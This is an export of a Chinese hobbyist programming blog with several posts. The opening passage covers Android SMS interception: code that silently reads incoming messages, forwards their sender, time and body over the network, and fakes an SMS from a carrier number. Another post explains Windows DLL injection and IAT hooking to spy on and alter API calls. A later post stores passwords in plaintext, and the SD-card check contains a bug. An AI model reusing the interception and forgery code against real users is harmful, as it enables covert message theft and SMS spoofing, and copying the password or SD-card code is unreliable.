<p>这个权限就是操作网络用到的。<br>这里有一个坑，搞得当时我有点烦，就是java默认的是宽字节，但是Windows中的那个<code>recvfrom</code>第二个参数是char*就有点烦，测试的时候我发的时候总是会丢失一些字节，我一开始以为是C++写的时候有错误，一直在找，然后怎么也解决不了，我就浏览内存找，怎么也没找到bug，后来就调试了一下java，发现<code>String.length()</code>返回的是宽字节个数，但是我声明的时候明明传的给的”GBK”这个参数，我也没搞明白，然后我一开始想到的解决办法是，无非就是中文字符占两个有点难搞，我就用正则匹配得出中文个数，然后将length加上这个中文个数，确实是正常的，但是我总感觉怪怪的，后来我就改成了<code>sMessage.getBytes(&quot;GBK&quot;).length</code>，这个就没什么问题了。</p>
<hr>
<p>写完了发送函数，就该写拦截短信的方法了，继承<code>ContentObserver</code>这个类，重写<code>onChange</code>方法。<br>在<code>onCreate</code>方法中，我们先获取内容监听者的权限：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">mco = <span class="keyword">new</span> MyObserver(<span class="keyword">new</span> Handler());</span><br><span class="line">Uri uri = Uri.parse(<span class="string">"content://sms"</span>);</span><br><span class="line">getContentResolver().registerContentObserver(uri, <span class="keyword">true</span>, mco);</span><br></pre></td></tr></table></figure>
<p>mco是一个私有变量：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> MyObserver mco;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String sMessage;</span><br></pre></td></tr></table></figure>
<p>MyObserver这个使我们重写的类，代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">MyObserver</span> <span class="keyword">extends</span> <span class="title">ContentObserver</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">MyObserver</span><span class="params">(Handler handler)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>(handler);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onChange</span><span class="params">(<span class="keyword">boolean</span> selfChange, Uri uri)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onChange(selfChange);</span><br><span class="line">        <span class="keyword">if</span>(!selfChange)</span><br><span class="line">        &#123;</span><br><span class="line">        	Cursor cursor = getContentResolver().query(uri, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">            String body = <span class="keyword">null</span>;</span><br><span class="line">            String address=<span class="keyword">null</span>;</span><br><span class="line">            String date=<span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">while</span>(cursor.moveToNext())</span><br><span class="line">            &#123;</span><br><span class="line">            	body=cursor.getString(cursor.getColumnIndex(<span class="string">"body"</span>));</span><br><span class="line">            	address = cursor.getString(cursor.getColumnIndex(<span class="string">"address"</span>));</span><br><span class="line">            	date = cursor.getString(cursor.getColumnIndex(<span class="string">"date"</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            Date time = <span class="keyword">new</span> Date(Long.parseLong(date));</span><br><span class="line">            SendNetMessage(<span class="string">"发件人手机号:"</span>+address+<span class="string">"发送时间:"</span>+time+<span class="string">"发送数据:"</span>+body);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>构造函数没什么，就传进来一个Handle对象，new一个给他就好了，在这里不重要。<br>在<code>onCreate</code>方法中我们实例化一个这个对象，然后再new一个Uri对象，这个Uri对象是用来表示我们监听的对象，也就是sms这个短信，观察安卓源代码，他里面有这么一段：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ContentResolver resolver = getContext().getContentResolver();</span><br><span class="line">resolver.notifyChange(uri, <span class="keyword">null</span>);</span><br></pre></td></tr></table></figure>
<p>类似于这样的一段代码，就是用来通知这个监听器的，之前我以为这个监听是类似于HOOK的一个东西，原来不是。<br>我们构造Uri对象之后，然后就需要把这个我们自己的ContentObserver注册上去，<code>getContentResolver().registerContentObserver(uri, true, mco);</code>，获取到这个单例对象之后使用注册的这个函数就可以了，第二个参数我们用true代表的是模糊匹配Uri。<br>在我们重写的<code>onChange</code>方法中，我们得到Uri对象之后，通过内容解析出这个Uri所对应的Cursor对象，以此来查询短信这个APP中的数据库，主要有这三个比较重要的字段：</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>body</td>
<td>短信的内容</td>
</tr>
<tr>
<td>address</td>
<td>短信的提供者</td>
</tr>
<tr>
<td>date</td>
<td>短信的格林尼治时间戳</td>
</tr>
</tbody></table>
<p>其实还有个Type这个字段，我没写上去，这个的话呢代表是发送还是接受，我懒得写了就没增加判断。<br>然后遍历出来我们的数据之后，然后通过之前我们写好的那个函数就可以进行数据的收发了。<br>但是要注意的是，这个时候还是不可以的，我们需要给我们的APP增加几个权限：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.SEND_SMS"</span>&gt;</span><span class="tag">&lt;/<span class="name">uses-permission</span>&gt;</span><span class="comment">&lt;!--添加权限--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.RECEIVE_SMS"</span>&gt;</span><span class="tag">&lt;/<span class="name">uses-permission</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.READ_SMS"</span>&gt;</span><span class="tag">&lt;/<span class="name">uses-permission</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.WRITE_SMS"</span>&gt;</span><span class="tag">&lt;/<span class="name">uses-permission</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>也就是SMS需要的权限，可以尝试一些是否可以进行劫持接受的短信，我们可以写这样的一段代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ContentResolver contentResolver = getContentResolver();</span><br><span class="line">Uri uri = Uri.parse(<span class="string">"content://sms"</span>);</span><br><span class="line">ContentValues values = <span class="keyword">new</span> ContentValues();</span><br><span class="line">values.put(<span class="string">"body"</span>, <span class="string">"Wker通知：高等数学不学好，考研就要买医保"</span>);</span><br><span class="line">values.put(<span class="string">"address"</span>, <span class="string">"10086"</span>);</span><br><span class="line">values.put(<span class="string">"type"</span>, <span class="string">"1"</span>);</span><br><span class="line">values.put(<span class="string">"date"</span>, System.currentTimeMillis());</span><br><span class="line">contentResolver.insert(uri, values);</span><br></pre></td></tr></table></figure>
<p>这个是模拟短信的接受，同样我们可以进行一个简单的测试：</p>
<p><img src="img2.jpg" alt="接收测试"></p>
<p>可以看到我们同样拦截到了。</p>
<h2 id="程序的优化"><a href="#程序的优化" class="headerlink" title="程序的优化"></a>程序的优化</h2><ol>
<li>在java层，如果我们真正的想要进行一个欺骗，我们可以选择先更改我们的接收到的短信的内容，其实这个也是可以做到的，而且不是很难。</li>
<li>增加对type类型的判断，判断是不是要进行接受和发送的判断</li>
</ol>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>API函数监视器</title>
    <url>/2020/02/14/API%E5%87%BD%E6%95%B0%E7%9B%91%E8%A7%86%E5%99%A8/</url>
    <content><![CDATA[<h2 id="API函数监视器"><a href="#API函数监视器" class="headerlink" title="API函数监视器"></a>API函数监视器</h2><p>这个工具是在之前的基础上修改的，主要的作用是监视某个进程的，作用就是监视某个函数，然后当这个函数被程序调用的时候我们就劫持他，让他的参数先传递给我们，我们通过修改参数或查看参数的值，然后达到我们的目的。<br>首先我们先简单的写一个一个验证的小程序：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> CProcessTestDlg::OnBnClickedButton1()</span><br><span class="line">&#123;</span><br><span class="line">	WriteProcessMemory(GetCurrentProcess(),(LPVOID)<span class="number">1700988</span>,(LPVOID)<span class="number">123</span>,<span class="number">4</span>,<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> CProcessTestDlg::OnBnClickedButton2()</span><br><span class="line">&#123;</span><br><span class="line">	MessageBox(<span class="string">"aaaaaaaaaa"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里我用MFC写，为什么要用<code>WriteProcessMemory</code>函数，因为这个工具有的时候确实有的时候需要监视这个函数（其实也就是有的时候懒得做外挂，想直接抄别人的），内存地址不管对不对，反正能调用这个函数就好了，然后再来个<code>MessageBox</code>做下显示检测。<br>首先我们要监视函数，那么我们首先要知道这个函数在哪个DLL文件中，而且有点要注意的有两点：</p>
<ol>
<li>在我编写测试的过程中发现了一个比较关键的一点，就是DLL文件我们要用大写，我不知道是不是别的机子要这样，反正我是这样子，可能是我HOOKAPI那块有点小纰漏，但是不影响。</li>
<li>还有就是要知道函数是分为两个版本的，宽字节和多字节，比较简单的判断就是看界面（反正看着有点老的就是多字节），还有就是看编写语言，反正判断方法很多，无非试两遍，比如<code>MessageBox</code>其实在这是<code>MessageBoxA</code>，因为我把环境调节成了多字节。</li>
</ol>
<p>程序由两部分组成，一部分是主程序，另一部分是DLL文件，这个DLL文件要程序放在一个DLL中，不是为了让住程序加载，而是为了让主程序知道DLL在哪，这个样子才能让我远程注入到其他程序。</p>
<p>首先我们写上必要的参数，也就是运行程序的路径（可以是绝对路径），然后要监视的API函数和对应的DLL模块。<br><img src="img1.jpg" alt="必要信息"></p>
<p>然后我们要知道这个函数的参数是什么样子的，还需要知道参数大小，这个我们查MSDN就可以查出来，例如<code>MessageBoxA</code>：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">MessageBox</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HWND hWnd,          <span class="comment">// handle of owner window</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCTSTR lpText,     <span class="comment">// address of text in message box</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCTSTR lpCaption,  <span class="comment">// address of title of message box</span></span></span></span><br><span class="line"><span class="function"><span class="params">  UINT uType          <span class="comment">// style of message box</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>可以看到，这几个都是四字节的，所以我们就可以添加四个四字节参数：<br><img src="img2.jpg" alt="参数填写"></p>
<p>然后这个时候我们在测试程序中调用<code>MessageBoxA</code>，然后我们会看到我们程序出现这个情况：<br><img src="img3.jpg" alt="程序劫持"><br>点击按钮之后未响应，我们监控程序这边有了数据，可以看到<code>MessageBoxA</code>的参数都列举了出来，最后一个其实也就是<code>MessageBox</code>的类型，我们原先是默认的，我们现在随便调一个：<br><img src="img4.jpg" alt="程序相应"><br>可以看到<code>MessageBoxA</code>的模式变了，我们再来监视一下写内存的那个函数：<br>现需要看下函数的原型：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">WriteProcessMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hProcess,  <span class="comment">// handle to process whose memory is written to</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID lpBaseAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">                    <span class="comment">// address to start writing to</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID lpBuffer,  <span class="comment">// pointer to buffer to write data to</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD nSize,      <span class="comment">// number of bytes to write</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpNumberOfBytesWritten </span></span></span><br><span class="line"><span class="function"><span class="params">                    <span class="comment">// actual number of bytes written</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>可以看到，还是都是四个字节的。<br><code>Import Library: Use kernel32.lib.</code>。<br>然后和上面一样，可以看到如下的结果：<br><img src="img5.jpg" alt="劫持结果"><br>可以看到和上面是一模一样的：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">WriteProcessMemory(GetCurrentProcess(),(LPVOID)<span class="number">1700988</span>,(LPVOID)<span class="number">123</span>,<span class="number">4</span>,<span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>
<p>我们可以在劫持的这段时间进行内存的修改。</p>
<p>可能会有人说那个<code>MessageBoxA</code>怎么都是数字，其实是指针，你可以拿OD跟一下。</p>
<h2 id="程序原理分析"><a href="#程序原理分析" class="headerlink" title="程序原理分析"></a>程序原理分析</h2><p>程序效果都看到了，那就该看看到底是如何实现的了。</p>
<p>首先我在启动目标程序的时候，注入了DLL，这个DLL中包含了我们需要用到的内容，两个全局变量，这个之前我在博客中已经介绍到了，一个是用内存映射共享内存的，一个是用来HOOKAPI的，共享内存和HOOKAPI的类我也在之前的博客介绍过了。<br>这里共享一个结构体：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">CAPISpyData</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">char</span> szModName[<span class="number">256</span>];</span><br><span class="line">	<span class="keyword">char</span> szFuncName[<span class="number">256</span>];</span><br><span class="line">	BOOL bPass;</span><br><span class="line">	HWND hWndCaller;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>第一个是模块名，第二个是函数名，第三个是是否用户允许运行了，第四个是接受信息的窗口句柄。<br>这些都不是很重点，主要说一下程序的运行。<br>HOOKAPI的思路，也就是修改程序IAT导入表的值，寻找我们的函数，找到函数之后替换成我们的函数，比较关键的就是我们这个函数怎么写是最重要的。首先我们由于是不能确定函数是什么样子，也就是说我们不知道堆栈到底是怎么回事，所以我们只能用naked来修饰我们的函数，也就是说我们自己处理堆栈平衡，但是也正是因为我们没有办法使用正常的函数，这里就有了一个比较关键的一个事情，就是我们要想使用我之前写的那个内存共享类的话呢我们只能再次申请一个函数，用来传输数据，因为我们不能在naked的函数中使用初始化了变量，所以我们要到一个正常函数，在这个正常函数中，我们内敛汇编获取当前ebp的值，也就是栈顶，获取之后并不是真正的参数顶端，因为我们需要明白，在程序调用我们监视的函数时，在压入参数之后需要CALL，这个CALL将那个位置的eip压入了栈，这是第一个四字节，然后因为我们在调用哪个不得不调用的发送消息的函数（也就是上面内存共享类不能再naked函数中运行不得不写的函数），这个时候我们又CALL了一遍，又压入了第二个四字节，然后因为我们的函数是正常的C++函数，所以程序还会压入当前ebp为了最后恢复，到此为止我们压入了三个四字节，也就是一个C，所以我们程序要这么写：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">NotifyCaller</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">CMyShareMem <span class="title">mem</span><span class="params">(FALSE)</span></span>;</span><br><span class="line">	DWORD Addres;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		mov Addres,ebp</span><br><span class="line">		add Addres,<span class="number">0xC</span></span><br><span class="line">	&#125;</span><br><span class="line">	SendMessage(mem.GetData()-&gt;hWndCaller,HM_SPYACALL,(WPARAM)Addres,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">while</span>(!mem.GetData()-&gt;bPass)&#123;</span><br><span class="line">		Sleep(<span class="number">100</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	mem.GetData()-&gt;bPass = FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__declspec(naked)<span class="function"><span class="keyword">void</span> <span class="title">HookProc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	NotifyCaller();</span><br><span class="line"></span><br><span class="line">	DWORD dwOrgAddr;<span class="comment">//不可以直接赋值</span></span><br><span class="line">	dwOrgAddr = (DWORD)PROC(g_orgFun);</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		mov eax,dwOrgAddr</span><br><span class="line">		jmp eax</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们获取到当前ebp的值的时候，通过消息的WPARAM参数传给我们的程序，这就是关键代码段，我们重载了PROC操作符，所以可以返回的是旧的函数地址，然后再跳回去，这个样子我们就保证了堆栈完全的平衡。<br>还有一点就是在我们等待的时候我在里面写了个<code>Sleep</code>，其实这个我做了几个测试，我没写任何代码的时候会出错，所以我加进去的。<br><img src="img6.jpg" alt="第一个四字节"><br><img src="img7.jpg" alt="第二个四字节"><br><img src="img8.jpg" alt="第三个四字节"></p>
<p>在我们自定的相应消息的时候可以这么写：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">afx_msg LRESULT CAPISpyEXEDlg::OnHmSpyacall(WPARAM wParam, LPARAM lParam)</span><br><span class="line">&#123;</span><br><span class="line">	DWORD Addres = (DWORD)wParam;</span><br><span class="line">	CString s;</span><br><span class="line">	HANDLE h = OpenProcess(PROCESS_ALL_ACCESS,FALSE,m_dwPID);</span><br><span class="line">	m_btnPass.EnableWindow(TRUE);</span><br><span class="line">	DWORD value;</span><br><span class="line">	<span class="keyword">char</span> v[<span class="number">255</span>];</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;m_list.GetItemCount();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		s = m_list.GetItemText(i,<span class="number">1</span>);</span><br><span class="line">		ReadProcessMemory(h,(LPVOID)(Addres+i*<span class="number">4</span>),&amp;value,atoi(s),<span class="literal">NULL</span>);</span><br><span class="line">		itoa(Addres+i*<span class="number">4</span>,v,<span class="number">10</span>);</span><br><span class="line">		m_list.SetItemText(i,<span class="number">2</span>,v);</span><br><span class="line">		itoa(value,v,<span class="number">10</span>);</span><br><span class="line">		m_list.SetItemText(i,<span class="number">3</span>,v);</span><br><span class="line">	&#125;</span><br><span class="line">	CloseHandle(h);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>只列出了部分关键代码，一些其他的不重要的也就不列出了，太长了。</p>
]]></content>
      <categories>
        <category>Win32编程</category>
      </categories>
      <tags>
        <tag>Win32编程</tag>
      </tags>
  </entry>
  <entry>
    <title>Android信息记录</title>
    <url>/2020/02/13/Android%E4%BF%A1%E6%81%AF%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="信息记录"><a href="#信息记录" class="headerlink" title="信息记录"></a>信息记录</h1><p>主要是应对处理记住密码，程序配置的这种操作，有点像Windows下的ini文件，但是这个对应的是XML。</p>
<h2 id="SharedPreferences类"><a href="#SharedPreferences类" class="headerlink" title="SharedPreferences类"></a>SharedPreferences类</h2><p>这个类操作起来比较的简单，无非就是获取编辑器然后写。读就是直接读。<br>这个对象不是new的，而是通过方法获得的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> SharedPreferences prf;</span><br><span class="line">prf = getSharedPreferences(<span class="string">"config"</span>, MODE_PRIVATE);<span class="comment">//第一个参数是文件名，第二个参数是文件的权限(MODE_PRIVATE，私有的),MODE_WORLD_READABLE+MODE_WORLD_WRITEABLE这个就是其他APP也可以用的</span></span><br><span class="line">Editor edit = prf.edit();</span><br><span class="line">edit.putString(<span class="string">"Name"</span>, <span class="string">"Wker"</span>);</span><br><span class="line">edit.commit();<span class="comment">//提交内存信息</span></span><br></pre></td></tr></table></figure>
<p>这个样子我们就存储了我们的内容，权限的话呢就是对应的rw那三个。<br>读取的话呢也是比较简单的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">prf.getString(<span class="string">"Name1"</span>, <span class="string">"ppp"</span>)</span><br></pre></td></tr></table></figure>
<p>第二个参数是个默认值，就和我们在读ini一样，也需要一个默认值，就是这个节点不存在的话呢，所返回的值。</p>
<h2 id="实例记住密码"><a href="#实例记住密码" class="headerlink" title="实例记住密码"></a>实例记住密码</h2><p>首先我们先布局：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">"http://schemas.android.com/tools"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">	<span class="attr">android:orientation</span>=<span class="string">"vertical"</span>&gt;</span></span><br><span class="line">	</span><br><span class="line">    <span class="tag">&lt;<span class="name">EditText</span> </span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/Ed1"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">  		<span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">EditText</span> </span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/Ed2"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">  		<span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">CheckBox</span> </span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/Cb_rember"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">  		<span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span>  </span></span><br><span class="line"><span class="tag">  		<span class="attr">android:text</span>=<span class="string">"记住密码"</span>      </span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span> </span></span><br><span class="line"><span class="tag">        <span class="attr">android:onClick</span>=<span class="string">"onClick"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/Bt_Login"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">  		<span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span>  </span></span><br><span class="line"><span class="tag">  		<span class="attr">android:text</span>=<span class="string">"登录"</span>  </span></span><br><span class="line"><span class="tag">  		<span class="attr">android:layout_gravity</span>=<span class="string">"center_horizontal"</span>            </span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>android:onClick=&quot;onClick&quot;</code>这个属性节点，主要是告诉编译器，我们这个按钮控件的一个点击事件，我直接放在名为：<code>onClick</code>这个方法里面，这个名字可以自己改。</p>
<p>首先我们先是初始化控件和记录对象：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> EditText ed_1;</span><br><span class="line"><span class="keyword">private</span> EditText ed_2;</span><br><span class="line"><span class="keyword">private</span> CheckBox cb_rem;</span><br><span class="line"><span class="keyword">private</span> SharedPreferences prf;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">......</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">prf = getSharedPreferences(<span class="string">"config"</span>, MODE_PRIVATE);</span><br><span class="line">ed_1 = (EditText) findViewById(R.id.Ed1);</span><br><span class="line">ed_2 = (EditText) findViewById(R.id.Ed2);</span><br><span class="line">cb_rem = (CheckBox) findViewById(R.id.Cb_rember);</span><br></pre></td></tr></table></figure>
<p>然后我们处理点击事件。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Editor edit = prf.edit();</span><br><span class="line">	<span class="keyword">if</span>(cb_rem.isChecked())</span><br><span class="line">	&#123;</span><br><span class="line">		edit.putString(<span class="string">"username"</span>, ed_1.getText().toString()).putString(<span class="string">"password"</span>, ed_2.getText().toString());</span><br><span class="line">		edit.putBoolean(<span class="string">"rember"</span>, <span class="keyword">true</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		edit.remove(<span class="string">"username"</span>).remove(<span class="string">"password"</span>);</span><br><span class="line">		edit.putBoolean(<span class="string">"rember"</span>, <span class="keyword">false</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	edit.commit();</span><br><span class="line">	Toast.makeText(<span class="keyword">this</span>, <span class="string">"OK"</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看出就是通过checkbox是否选中，来选择是不是记住密码，不是的话呢就remove，最后提交。</p>
<p>然后在我们onCreate执行的时候我们判断一下就好了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(prf.getBoolean(<span class="string">"rember"</span>, <span class="keyword">false</span>))</span><br><span class="line">&#123;</span><br><span class="line">	ed_1.setText(prf.getString(<span class="string">"username"</span>, <span class="string">""</span>));</span><br><span class="line">	ed_2.setText(prf.getString(<span class="string">"password"</span>, <span class="string">""</span>));</span><br><span class="line">	cb_rem.setChecked(<span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Android文件操作</title>
    <url>/2020/02/13/Android%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<h1 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h1><p>安卓下面操作文件其实也就是类似于Linux下的文件操作，有权限就能操作，没权限就不能操作。</p>
<h2 id="文件路径获取"><a href="#文件路径获取" class="headerlink" title="文件路径获取"></a>文件路径获取</h2><p>首先我们先要获取文件的路径，可以通过这三个API函数。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">File file = Environment.getExternalStorageDirectory();</span><br><span class="line">File file1 = getCacheDir();</span><br><span class="line">File file2 = getFilesDir();</span><br><span class="line">Log.d(<span class="string">"SD"</span>, file.getPath());</span><br><span class="line">Log.d(<span class="string">"File Dir"</span>, file2.getPath());</span><br><span class="line">Log.d(<span class="string">"File 缓存"</span>, file1.getPath());</span><br></pre></td></tr></table></figure>
<p>第一个是SD卡的目录，第二个是我们APP默认存储的目录，第三个就是我们APP缓存的一个目录。<br>一般我们要用的就是SD卡，但是如果我们要操作SD卡的话呢，我们需要给我们的程序操作SD卡的权限：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">"android.permission.WRITE_EXTERNAL_STORAGE"</span></span></span><br><span class="line"><span class="tag">    /&gt;</span><span class="comment">&lt;!-- 在外部存储设备有写权限（SD卡） --&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个是写的，相对于读的话呢，我们是不需要给的，但是安卓也给了个常亮，也就是那个write换成read，貌似不需要用到。</p>
<h2 id="判断有无SD卡"><a href="#判断有无SD卡" class="headerlink" title="判断有无SD卡"></a>判断有无SD卡</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">existSDcard</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	String state = Environment.getExternalStorageState();</span><br><span class="line">	<span class="keyword">if</span> (state.equals(Environment.MEDIA_MOUNTED)) &#123;</span><br><span class="line">		Log.d(<span class="string">"SD"</span>, <span class="string">"有"</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		Log.d(<span class="string">"SD"</span>, <span class="string">"有"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到就是通过那个环境类的函数判断的，最后比较字符串是不是相等。</p>
<h2 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h2><p>和javaSE是一样的。</p>
